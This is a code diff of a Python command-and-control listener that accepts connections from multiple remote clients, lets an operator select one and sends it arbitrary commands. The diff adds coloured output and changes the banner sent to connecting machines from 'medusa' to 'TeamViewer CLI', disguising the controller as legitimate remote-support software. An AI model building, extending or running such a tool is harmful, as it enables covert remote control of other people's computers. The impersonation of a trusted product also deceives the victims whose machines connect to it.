@@ -1,25 +1,28 @@
 import socket
 import threading
+from colorama import init, Fore, Style
+
+init(autoreset=True)
 
 clients = {}
 lock = threading.Lock()
 current_client_id = None
 
 def handle_client(conn, addr, client_id):
-    print(f"[+] {client_id} connected from {addr}")
-    conn.send(b'Connected to medusa\n')
+    print(Fore.GREEN + f"[+] {client_id} connected from {addr}")
+    conn.send(b'Connected to TeamViewer CLI\n')
     while True:
         try:
             data = conn.recv(4096)
             if not data:
                 break
-            print(f"[{client_id}] {data.decode(errors='ignore')}")
+            print(Fore.CYAN + f"[{client_id}] " + Style.RESET_ALL + data.decode(errors='ignore'))
         except:
             break
     with lock:
         del clients[client_id]
     conn.close()
-    print(f"[-] {client_id} disconnected")
+    print(Fore.RED + f"[-] {client_id} disconnected")
 
 def accept_connections(server):
     client_counter = 0
@@ -34,17 +37,17 @@ def accept_connections(server):
 def command_loop():
     global current_client_id
     while True:
-        cmd = input("tv> ").strip()
+        cmd = input(Fore.YELLOW + "tv> " + Style.RESET_ALL).strip()
         if cmd.startswith("rc"):
-            print("Available clients:")
+            print(Fore.BLUE + "Available clients:")
             for cid in clients:
                 print(f" - {cid}")
             target = input("Select client: ").strip()
             if target in clients:
                 current_client_id = target
-                print(f"Now controlling: {current_client_id}")
+                print(Fore.MAGENTA + f"Now controlling: {current_client_id}")
             else:
-                print("Invalid client ID.")
+                print(Fore.RED + "Invalid client ID.")
         elif current_client_id and current_client_id in clients:
             if cmd == "exit":
                 current_client_id = None
@@ -52,9 +55,9 @@ def command_loop():
                 try:
                     clients[current_client_id].send(cmd.encode())
                 except:
-                    print("Failed to send command.")
+                    print(Fore.RED + "Failed to send command.")
         else:
-            print("No client selected. Use 'rc'.")
+            print(Fore.RED + "No client selected. Use 'rc'.")
 
 def main():
     host = "0.0.0.0"
@@ -62,7 +65,7 @@ def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
     server.listen()
-    print(f"[+] Server listening on {host}:{port}")
+    print(Fore.GREEN + f"[+] Server listening on {host}:{port}")
     threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
     command_loop()
 
